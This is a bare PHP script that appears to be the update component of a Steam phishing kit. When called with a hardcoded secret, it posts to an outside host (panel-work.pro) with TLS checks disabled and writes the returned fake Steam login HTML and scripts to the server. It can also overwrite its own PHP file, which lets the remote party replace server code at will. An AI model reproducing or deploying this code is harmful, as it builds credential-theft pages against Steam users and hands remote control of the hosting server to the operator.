<?php

$phpName = "39a62e4da57db4ced017c13c78611309.php";
$steamHtmlName = "rh59hdhwipn2.html";
$steamScriptName = "arr1la2enn4y.js";
$windowScriptName = "ldg1vqx3pqt8.js";
$domainToLogin = "panel-work.pro";
$resourceUrl = "https://panel-work.pro/f8rpehyitiefwvsec2lmorbh0tbegaukgawys";
$postData = [
    "secret" => "9e23e89f9924d684263b2cada7e4f368",
    "authBtnClass" => "ewyisfrvo26t",
    "steamHtmlName" => $steamHtmlName,
    "steamScriptName" => $steamScriptName,
    "windowScriptName" => $windowScriptName,
];
$buildId = "8bbe7fab-d5e0-4590-b350-59f374a2f55d";


$update = isset($_GET['update']) && $_GET['update'] === 'true';
$secret = isset($_GET['secret']) ?$_GET["secret"] : null;

if($secret !== $postData["secret"]){
	echo "false";
} else if($update) {
	$ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, $resourceUrl);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

	$response = curl_exec($ch);

	if(curl_errno($ch)) {
		echo 'Error:' . curl_error($ch);
	} else {
		$responseData = json_decode($response, true);

		if (isset($responseData['windowScript'])) {
			file_put_contents($windowScriptName, $responseData["windowScript"]);
		}

		if (isset($responseData['steamScript'])) {
			file_put_contents($steamScriptName, $responseData["steamScript"]);
		}

		if (isset($responseData['steamFile'])) {
			file_put_contents($steamHtmlName, $responseData["steamFile"]);
		}

		if (isset($responseData['updatePhp'])) {
			file_put_contents($phpName, $responseData["updatePhp"]);
		}

		echo "success";
	}

	curl_close($ch);
} else {
	header('Content-Type: application/json');

	echo json_encode([
		"success" => true,
		"buildId" => $buildId
	]);
}

?>